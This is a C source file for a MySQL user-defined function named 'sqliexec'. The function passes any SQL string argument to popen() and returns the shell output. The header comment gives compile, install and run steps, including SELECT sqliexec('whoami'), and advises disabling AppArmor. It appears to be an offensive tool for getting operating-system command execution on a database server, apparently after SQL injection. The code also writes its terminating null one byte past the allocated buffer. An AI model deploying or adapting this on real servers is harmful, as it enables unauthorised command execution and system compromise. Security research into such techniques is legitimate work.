#include <stdlib.h>
#include <stdio.h>
#include <string.h>
typedef unsigned long long ulonglong;
typedef long long longlong;
#include <mysql.h>
#include <ctype.h>

/*
	Description: Write the compiled library to the plugins directory of mysql & load it to be able to run shell commands just like mssql's cmdexec
	Compile Example: gcc -fPIC -Wall -I/usr/include/mysql -shared -o sqliexec.so sqliexec.c // on ubuntu with installed headers
	Find Plugin DIR: SHOW VARIABLES LIKE '%plugin%';
	Install: CREATE FUNCTION sqliexec RETURNS STRING SONAME 'sqliexec.so';
	Run: SELECT sqliexec('whoami');
	Notes: make sure AppArmor is turned off for mysql on linux machines
	Author: Kasif Dekel
	Version: 1.0
*/
int sqliexec_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
void sqliexec_deinit(UDF_INIT *initid);
char *sqliexec(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error);
 
 
int sqliexec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
	if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
		strcpy(message, "arguments error");
		return 1;
	}
	return 0;
}

void sqliexec_deinit(UDF_INIT *initid) { }

char *sqliexec(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error) {
	const char *input = args->args[0]; unsigned long count, linelen; char line[1024]; FILE *pipe;
	pipe = popen(input, "r"); 
	if(!pipe){ *is_null = 1; return NULL; }
	result = malloc(1);
	if(result == NULL) { *is_null = 1; return result; }
	
	count = 0;
	while (fgets(line, sizeof(line), pipe) != NULL) {
		linelen = strlen(line);
		result = realloc(result, count + linelen);
		strncpy(result + count, line, linelen);
		count = count + linelen;
	}

	pclose(pipe);
	result[count] = 0;
	*length = strlen(result);
	return result;
}